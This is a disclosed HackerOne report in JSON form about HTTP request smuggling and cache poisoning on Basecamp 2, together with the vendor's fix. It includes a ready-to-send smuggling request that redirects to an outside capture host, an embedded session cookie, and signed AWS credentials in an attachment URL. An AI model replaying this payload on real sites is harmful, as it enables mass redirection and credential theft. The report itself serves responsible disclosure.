{"id":919175,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTkxNzU=","url":"https://hackerone.com/reports/919175","title":"HTTP request smuggling on Basecamp 2 allows web cache poisoning","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-07-08T18:38:41.851Z","submitted_at":"2020-07-08T18:38:41.851Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hazimaslam","url":"/hazimaslam","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/4un4VdG5K6SG4UY8M1jXFkXE/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":67,"url":"https://hackerone.com/basecamp","handle":"basecamp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Basecamp","twitter_handle":"basecamp","website":"https://basecamp.com/about/policies/security/response","about":"Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-28T14:57:26.124Z","bug_reporter_agreed_on_going_public_at":"2020-10-28T14:57:26.063Z","team_member_agreed_on_going_public_at":"2020-10-27T18:13:27.650Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"It is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor.  During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.\n\n## Validation steps\n**1.**  Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.\n\n**2.** Paste the following request in Burp repeater (I've embedded my session in the request for your ease):\n\n```http\nPOST /4618984/account HTTP/1.1\nHost: basecamp.com\nConnection: keep-alive\nContent-Length: 144\nAccept: */*\nX-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;\nTransfer-Encoding: chunked\nTransfer-encoding: identity\n\n22\n_method=patch\u0026account%5Bname%5D=BC\n0\n\nGET /x HTTP/1.1\nX-Forwarded-Host: enjv2g5042bg.x.pipedream.net\nX-Forwarded-Proto: http\nFoo: bar\n```\nMake sure to set the target to `https://basecamp.com` and port to `443`.\n\n**3.** Issue the request in repeater.\n\n**4.** Observe the captured request in RequestBin.com\n\n## Impact\n\n- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.\n\n- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.\n\n- It is also possible to capture visitors' request headers and cookies.","bounty_amount":"1700.0","formatted_bounty":"$1,700","weakness":{"id":86,"name":"HTTP Request Smuggling"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-26T18:13:27.745Z","allow_singular_disclosure_after":-27552525.303660452,"singular_disclosure_allowed":true,"vote_count":15,"voters":["fqdn","ali","eren","zeroxyele","prinzhorn","d4r3d3v1l","0xr3dhunt","faizannehal","robinjoseph","the3b055","and 5 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":4654,"asset_type":"URL","asset_identifier":"basecamp.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8542061,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-07-08T18:40:02.245Z","updated_at":"2020-07-08T18:40:02.245Z","additional_data":{"old_title":"HTTP request smuggling on Basecamp 2 allows web cache poinsoning","new_title":"HTTP request smuggling on Basecamp 2 allows web cache poisoning"},"actor":{"username":"hazimaslam","cleared":true,"url":"/hazimaslam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4un4VdG5K6SG4UY8M1jXFkXE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8569387,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report, @hazimaslam. We’re awarding $1,700 to match your other HTTP request smuggling reports. This is a serious vulnerability and we’ll get it fixed soon.","automated_response":false,"created_at":"2020-07-11T16:20:58.362Z","updated_at":"2020-07-11T16:20:58.362Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Basecamp"}},"bounty_amount":"1700.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"basecamp","collaborator":{"username":"hazimaslam","url":"/hazimaslam"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8569388,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-07-11T16:21:13.336Z","updated_at":"2020-07-11T16:21:13.336Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8570386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the award!","automated_response":false,"created_at":"2020-07-11T22:49:56.288Z","updated_at":"2020-07-11T22:49:56.288Z","actor":{"username":"hazimaslam","cleared":true,"url":"/hazimaslam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4un4VdG5K6SG4UY8M1jXFkXE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8587205,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We’ve deployed a fix for this. The desync is between our load balancers and next-hop nginx servers. The load balancers now reject requests with both Content-Length and Transfer-Encoding headers with a 400 Bad Request response. This is technically a spec violation, but it’s our best option for now.\n\nMind confirming, @hazimaslam?","automated_response":false,"created_at":"2020-07-13T20:15:08.441Z","updated_at":"2020-07-13T20:15:08.441Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8598588,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, confirming it is fixed.\n\n{F907375}","automated_response":false,"created_at":"2020-07-14T18:29:11.365Z","updated_at":"2020-07-14T18:29:11.365Z","actor":{"username":"hazimaslam","cleared":true,"url":"/hazimaslam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4un4VdG5K6SG4UY8M1jXFkXE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":907375,"filename":"Screenshot_2020-07-14_at_11.28.22_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/A3QBNSWyzeuKyNswSQEJWghu?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-07-14_at_11.28.22_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-07-14_at_11.28.22_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154213Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=df02f1acacca3b5c3b6509109cd3dda57fce1f3ccc5921cb0adb2ab025765d93"}],"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8598620,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-07-14T18:34:20.251Z","updated_at":"2020-07-14T18:34:20.251Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"hazimaslam","url":"/hazimaslam"},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9651327,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-27T18:13:27.673Z","updated_at":"2020-10-27T18:13:27.673Z","first_to_agree":true,"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9660978,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-28T14:57:26.094Z","updated_at":"2020-10-28T14:57:26.094Z","actor":{"username":"hazimaslam","cleared":true,"url":"/hazimaslam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4un4VdG5K6SG4UY8M1jXFkXE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9660979,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-28T14:57:26.153Z","updated_at":"2020-10-28T14:57:26.153Z","actor":{"username":"hazimaslam","cleared":true,"url":"/hazimaslam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4un4VdG5K6SG4UY8M1jXFkXE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}